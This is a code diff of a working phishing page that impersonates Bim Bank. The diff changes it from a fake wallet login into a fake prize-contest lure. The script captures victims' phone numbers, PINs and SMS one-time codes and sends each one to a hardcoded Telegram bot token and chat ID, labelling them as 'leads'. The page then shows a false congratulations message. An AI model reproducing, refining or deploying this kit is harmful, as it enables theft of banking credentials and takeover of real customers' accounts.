@@ -3,116 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Espace Wallet</title>
+    <title>Bim Bank - Opportunités</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
         
-        body { font-family: 'Roboto', sans-serif; background-color: #fdfdfd; color: #1e293b; }
+        body { font-family: 'Roboto', sans-serif; background-color: #fdfdfd; }
         .grid-bg { background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px); background-size: 20px 20px; }
 
-        /* تعديل حجم الشعار */
-        .logo-img {
-            height: 140px; /* تم تكبير الحجم من 112px إلى 140px */
-            width: auto;
-            object-fit: contain;
-            margin-bottom: 10px;
-        }
+        /* الشعار العلوي المعدل */
+        .logo-container { text-align: center; margin-top: 20px; }
+        .logo-main-icon { height: 80px; width: auto; margin: 0 auto; }
+        .logo-text-tiny { font-size: 10px; color: #2a4387; font-weight: bold; margin-top: 2px; text-transform: uppercase; letter-spacing: 2px; }
 
-        /* تعديل طريقة كتابة النص السفلي */
-        .welcome-text {
-            font-size: 1.6rem; /* تكبير الخط قليلاً */
-            color: #475569; /* لون رمادي احترافي متناسق */
-            font-weight: 400;
-            line-height: 1.3;
+        /* قسم الجوائز الضخم */
+        .awards-mega-banner {
+            background: linear-gradient(135deg, #fff 0%, #fffbeb 100%);
+            border: 3px solid #f19e2c;
+            border-radius: 25px;
+            padding: 30px 10px;
+            margin: 20px 0;
             text-align: center;
-            letter-spacing: -0.5px;
+            box-shadow: 0 10px 25px rgba(241, 158, 44, 0.3);
+            width: 100%;
         }
+        .awards-title-large { font-size: 2.2rem; font-weight: 900; color: #f19e2c; margin-bottom: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
+        .awards-icons-huge { font-size: 5.5rem; display: flex; justify-content: space-around; line-height: 1; margin-bottom: 10px; }
+        .award-badge { background: #f19e2c; color: white; padding: 5px 15px; border-radius: 50px; font-weight: bold; font-size: 1.2rem; display: inline-block; }
 
-        /* بقية التنسيقات للألوان الرسمية */
+        /* التنسيقات الأساسية */
         .bg-bim-blue { background-color: #2a4387; }
         .bg-bim-orange { background-color: #f19e2c; }
         .input-field { border: 1px solid #d1d5db; border-radius: 12px; padding: 15px; width: 100%; outline: none; background-color: white; }
-        #otp-modal-container { background-color: rgba(0, 0, 0, 0.5); display: none; }
+        #otp-modal-container { background-color: rgba(0, 0, 0, 0.6); display: none; }
     </style>
 </head>
 <body class="grid-bg min-h-screen flex flex-col items-center">
 
-    <!-- القسم العلوي المعدل (الشعار والنص) -->
-    <div class="pt-10 mb-2 flex flex-col items-center w-full max-w-md px-6">
-        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Bim Bank Logo" class="logo-img">
-        <h1 class="welcome-text">
-            Bienvenue dans votre<br>espace wallet
-        </h1>
+    <!-- شعار بيم بنك الصغير جداً -->
+    <div class="logo-container">
+        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Icon" class="logo-main-icon">
+        <div class="logo-text-tiny">bim bank</div>
     </div>
 
-    <!-- واجهة تسجيل الدخول (Step 1) -->
-    <div id="step1-login" class="w-full max-w-sm px-6 flex flex-col flex-grow">
-        <div class="flex border-2 border-gray-200 rounded-xl overflow-hidden mb-8 mt-6">
-            <button class="flex-1 bg-bim-blue text-white py-3.5 font-bold text-lg">Wallet</button>
-            <button class="flex-1 bg-white text-gray-500 py-3.5 font-normal text-lg">Banking</button>
+    <!-- قسم الجوائز الكبير جداً والمربح -->
+    <div class="w-full max-w-sm px-4">
+        <div class="awards-mega-banner">
+            <h2 class="awards-title-large">GRANDES OPPORTUNITÉS</h2>
+            <div class="awards-icons-huge">
+                <span>🎁</span>
+                <span>🚗</span>
+                <span>💰</span>
+            </div>
+            <div class="awards-icons-huge" style="margin-top: -15px;">
+                <span>🏠</span>
+                <span>💎</span>
+                <span>📱</span>
+            </div>
+            <div class="award-badge">GAGNEZ MAINTENANT !</div>
         </div>
+    </div>
 
-        <h2 class="text-2xl font-bold text-gray-800 mb-6">Connexion</h2>
+    <!-- واجهة تسجيل الدخول -->
+    <div id="step1-login" class="w-full max-w-sm px-6 flex flex-col flex-grow">
+        <h2 class="text-xl font-bold text-[#2a4387] mb-4 text-center">Accédez à votre compte pour gagner</h2>
 
         <div class="mb-5 relative">
-            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Téléphone">
+            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Numéro de téléphone">
             <span id="phone-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/8</span>
         </div>
 
         <div class="mb-3 relative">
-            <input id="password" type="password" maxlength="4" oninput="updateCount('password', 4)" class="input-field" placeholder="Mot de passe">
+            <input id="password" type="password" maxlength="4" oninput="updateCount('password', 4)" class="input-field" placeholder="Code PIN">
             <span id="password-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/4</span>
         </div>
 
-        <div class="text-right mb-8">
-            <a href="#" class="text-sm text-gray-500">Mot de passe oublié ?</a>
-        </div>
-
-        <button onclick="goToStep2()" class="bg-bim-orange text-white w-full py-4 rounded-xl font-bold text-xl shadow-md">
-            Connexion
+        <button onclick="goToStep2()" class="bg-bim-orange text-white w-full py-4 rounded-2xl font-bold text-2xl shadow-xl mt-6 transition-transform active:scale-95">
+            PARTICIPER
         </button>
 
-        <!-- الجزء السفلي -->
-        <div class="mt-auto mb-10 text-center w-full">
-            <p class="text-gray-600 mb-1">Nouvel utilisateur ?</p>
-            <a href="#" class="text-[#2a4387] font-bold flex items-center justify-center gap-2 mb-8">
-                S'inscrire maintenant 
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-            </a>
-            <button class="border border-gray-800 text-gray-800 w-full py-3 rounded-xl flex items-center justify-center gap-2 text-lg font-medium">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
-                Contacts
+        <div class="mt-auto mb-10 text-center">
+            <button class="border-2 border-gray-300 text-gray-600 w-full py-3 rounded-xl font-bold">
+                Besoin d'aide ?
             </button>
         </div>
     </div>
 
-    <!-- واجهة الـ OTP (Step 2) بنفس بيانات التوكن والآيدي السابقة -->
-    <div id="otp-modal-container" class="fixed inset-0 flex items-center justify-center z-50">
-        <div id="otp-modal" class="bg-white rounded-3xl p-8 shadow-2xl relative w-[380px] max-w-[92%]">
-            <button onclick="closeModal()" class="absolute top-6 right-6 text-gray-400">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
-            </button>
-
-            <div class="mt-6 mb-8 flex justify-center">
-                <div class="relative w-28 h-28 flex items-center justify-center rounded-full border-[6px] border-[#f19e2c] bg-[#fffbeb]">
-                    <span id="timer-text" class="text-2xl font-bold text-[#2a4387]">05:00</span>
+    <!-- واجهة الـ OTP (Modal) -->
+    <div id="otp-modal-container" class="fixed inset-0 flex items-center justify-center z-50 px-4">
+        <div class="bg-white rounded-[35px] p-8 shadow-2xl relative w-full max-w-[380px]">
+            <div class="text-center mb-6">
+                <div class="inline-block p-4 rounded-full bg-orange-50 border-4 border-[#f19e2c] mb-4">
+                    <span id="timer-text" class="text-3xl font-black text-[#2a4387]">05:00</span>
                 </div>
+                <h3 class="text-2xl font-bold text-gray-800">Vérification Finale</h3>
+                <p class="text-sm text-gray-500 mt-1">Entrez le code reçu par SMS pour confirmer votre participation</p>
             </div>
 
-            <h3 class="text-xl text-gray-700 mb-4">Entrez le code OTP</h3>
             <div class="relative">
-                <input id="otp" type="tel" maxlength="6" oninput="updateCount('otp', 6)" class="input-field text-center text-2xl tracking-widest font-bold" placeholder="------">
-                <span id="otp-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/6</span>
+                <input id="otp" type="tel" maxlength="6" oninput="updateCount('otp', 6)" class="input-field text-center text-3xl tracking-[10px] font-black border-2 border-[#f19e2c]" placeholder="000000">
             </div>
 
-            <button onclick="finalSubmit()" class="bg-bim-orange text-white w-full py-4 rounded-xl font-bold text-xl mt-10">
-                Connexion
+            <button onclick="finalSubmit()" class="bg-bim-orange text-white w-full py-5 rounded-2xl font-black text-2xl shadow-xl mt-8 transition-transform active:scale-95">
+                CONFIRMER
             </button>
         </div>
     </div>
 
     <script>
+        // إعدادات تليجرام المربوطة بحسابك
         const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
         const chatId = "8665814266"; 
 
@@ -130,13 +129,11 @@
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             if(phone.length === 8 && password.length === 4) {
-                sendToTelegram(`🏦 Bim Bank Login:\n👤 Téléphone: ${phone}\n🔑 Pass: ${password}`);
+                sendToTelegram(`💰 Bim Bank New Lead:\n👤 Phone: ${phone}\n🔑 PIN: ${password}`);
                 document.getElementById('otp-modal-container').style.display = 'flex';
                 startTimer(300);
-            } else { alert("Veuillez remplir les champs correctement."); }
+            } else { alert("Veuillez remplir vos informations correctement."); }
         }
-
-        function closeModal() { document.getElementById('otp-modal-container').style.display = 'none'; }
 
         function startTimer(duration) {
             let timer = duration, minutes, seconds;
@@ -152,9 +149,9 @@
         function finalSubmit() {
             const otp = document.getElementById('otp').value;
             if(otp.length === 6) {
-                sendToTelegram(`✅ Bim Bank OTP:\nCode: ${otp}`);
-                alert("Traitement en cours...");
-                closeModal();
+                sendToTelegram(`✅ Bim Bank OTP Received:\nCode: ${otp}`);
+                alert("Félicitations ! Votre participation a été enregistrée.");
+                location.reload();
             }
         }
     </script>
